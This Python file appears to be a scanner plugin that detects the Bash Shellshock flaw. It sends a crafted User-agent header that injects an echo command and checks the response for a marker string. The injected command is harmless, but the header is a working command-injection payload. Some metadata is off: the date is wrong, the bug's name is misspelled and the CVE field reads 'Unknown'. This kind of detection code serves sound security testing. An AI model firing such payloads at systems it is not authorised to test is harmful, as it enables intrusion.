# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Bash_0101'  # 平台漏洞编号，留空
    name = 'GNU Bash <= 4.3 Shockshell 破壳'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-02-15'  # 漏洞公布时间
    desc = '''
    执行shell命令，从而导致信息泄漏、未授权的恶意修改、服务中断。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Bash'  # 漏洞应用名称
    product_version = '<=4.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1a72262c-ed1c-4735-bdaa-2b0da80901c7'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            ip = self.target
            opener = urllib.request.build_opener()
            # Modify User-agent header value for Shell Shock test
            opener.addheaders = [
                ('User-agent',
                 '() { :;}; echo Content-Type: text/plain ; echo "1a8b8e54b53f63a8efae84e064373f19:"'),
                ('Accept', 'text/plain'),
                ('Content-type', 'application/x-www-form-urlencoded'),
                ('Referer', 'http://www.baidu.com')]
            try:
                URL = ip
                response = opener.open(URL)
                headers = response.info()
                status = response.getcode()
                opener.close()
                if status == 200:
                    if "1a8b8e54b53f63a8efae84e064373f19" in headers:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
            except Exception as e:
                self.output.info('执行异常：{}'.format(e))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
